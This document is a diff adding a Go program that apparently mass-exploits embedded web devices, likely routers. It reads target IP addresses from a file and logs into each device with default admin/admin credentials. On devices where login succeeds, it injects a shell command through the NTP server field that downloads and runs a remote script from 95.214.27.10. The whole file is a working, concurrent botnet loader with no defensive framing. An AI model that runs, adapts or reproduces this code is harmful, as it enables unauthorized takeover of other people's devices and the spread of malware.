@@ -1,0 +1,154 @@
+package main
+
+import (
+    "context"
+    "fmt"
+    "io/ioutil"
+    "net/http"
+    "strings"
+    "sync"
+    "time"
+)
+
+func main() {
+    // Read the IP addresses and ports from "ips.txt"
+    ipPorts, err := ioutil.ReadFile("ips.txt")
+    if err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+        return
+    }
+
+    // Split the file content into individual IP:Port strings
+    ipPortList := strings.Fields(string(ipPorts))
+
+    // Create a channel to control the number of concurrent Goroutines
+    maxGoroutines := 1000
+    sem := make(chan struct{}, maxGoroutines)
+
+    // Create a wait group to wait for all Goroutines to finish
+    var wg sync.WaitGroup
+
+    // Iterate over the list of IP:Port strings
+    for _, ipPort := range ipPortList {
+        wg.Add(1) // Increment the wait group counter for each host
+
+        // Launch a Goroutine for each host
+        go func(ipPort string) {
+            defer wg.Done() // Decrement the wait group counter when the Goroutine exits
+
+            // Trim any leading/trailing white spaces
+            ipPort = strings.TrimSpace(ipPort)
+
+            loginURL := fmt.Sprintf("http://%s/goform/setAuth", ipPort)
+            ntpURL := fmt.Sprintf("http://%s/goform/NTP", ipPort)
+
+            // Define the timeout duration
+            timeout := 10 * time.Second
+
+            // Create a context with a timeout
+            ctx, cancel := context.WithTimeout(context.Background(), timeout)
+            defer cancel()
+
+            // Create an HTTP client with a timeout
+            client := &http.Client{
+                Timeout: timeout,
+            }
+
+            // Define the POST data for login and NTP requests
+            loginPayload := "loginUser=admin&loginPass=admin"
+            ntpPayload := "ntpcurrenttime=2015-06-02+21%3A48&time_zone=CET_001&NTPServerIP=%60wget+http%3A%2F%2F95.214.27.10%2Ff.sh+-O-%7Csh%60&NTPDstEnable=0&NTPSync=2"
+
+            // Create an HTTP request for login with the context
+            loginReq, err := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(loginPayload))
+            if err != nil {
+                fmt.Println("Error creating login request for", ipPort, ":", err)
+                return
+            }
+
+            // Set request headers for login
+            loginReq.Header.Add("Host", ipPort)
+            loginReq.Header.Add("Content-Length", fmt.Sprintf("%d", len(loginPayload)))
+            loginReq.Header.Add("Cache-Control", "max-age=0")
+            loginReq.Header.Add("Upgrade-Insecure-Requests", "1")
+            loginReq.Header.Add("Origin", fmt.Sprintf("http://%s", ipPort))
+            loginReq.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+            loginReq.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36")
+            loginReq.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+            loginReq.Header.Add("Referer", fmt.Sprintf("http://%s/login.asp", ipPort))
+            loginReq.Header.Add("Accept-Encoding", "gzip, deflate, br")
+            loginReq.Header.Add("Accept-Language", "en-US,en;q=0.9")
+            loginReq.Header.Add("Connection", "close")
+
+            // Send the login request with the context
+            loginResp, err := client.Do(loginReq)
+            if err != nil {
+                fmt.Println("Error sending login request for", ipPort, ":", err)
+                if ctx.Err() == context.DeadlineExceeded {
+                    fmt.Println("Request timed out for", ipPort, ", skipping host")
+                    return
+                }
+                return
+            }
+            defer loginResp.Body.Close()
+
+            // Read the login response body
+            loginBody, err := ioutil.ReadAll(loginResp.Body)
+            if err != nil {
+                fmt.Println("Error reading login response body for", ipPort, ":", err)
+                return
+            }
+
+            // Check if the login response body contains "home.asp"
+            if strings.Contains(string(loginBody), "home.asp") {
+                fmt.Println("[nj3r] device successfully identified:", ipPort)
+
+                // Create an HTTP request for NTP with the context
+                ntpReq, err := http.NewRequestWithContext(ctx, "POST", ntpURL, strings.NewReader(ntpPayload))
+                if err != nil {
+                    fmt.Println("Error creating NTP request for", ipPort, ":", err)
+                    return
+                }
+
+                // Set request headers for NTP
+                ntpReq.Header.Add("Host", ipPort)
+                ntpReq.Header.Add("Content-Length", fmt.Sprintf("%d", len(ntpPayload)))
+                ntpReq.Header.Add("Cache-Control", "max-age=0")
+                ntpReq.Header.Add("Upgrade-Insecure-Requests", "1")
+                ntpReq.Header.Add("Origin", fmt.Sprintf("http://%s", ipPort))
+                ntpReq.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+                ntpReq.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36")
+                ntpReq.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+                ntpReq.Header.Add("Referer", fmt.Sprintf("http://%s/adm/management.asp", ipPort))
+                ntpReq.Header.Add("Accept-Encoding", "gzip, deflate, br")
+                ntpReq.Header.Add("Accept-Language", "en-US,en;q=0.9")
+                ntpReq.Header.Add("Connection", "close")
+
+                // Send the NTP request with the context
+                _, err = client.Do(ntpReq)
+                if err != nil {
+                    fmt.Println("Error sending NTP request for", ipPort, ":", err)
+                    if ctx.Err() == context.DeadlineExceeded {
+                        fmt.Println("Request timed out for", ipPort, ", skipping host")
+                        return
+                    }
+                    return
+                }
+
+                // Print a message indicating that the NTP request was successfully sent
+                fmt.Println("[nj3r] payload successfully sent to:", ipPort)
+            } else {
+                fmt.Println("Login failed for", ipPort)
+            }
+
+        }(ipPort)
+
+        // Add to the semaphore to limit the number of concurrent Goroutines
+        sem <- struct{}{}
+    }
+
+    // Wait for all Goroutines to finish
+    wg.Wait()
+
+    // Close the semaphore channel
+    close(sem)
+}
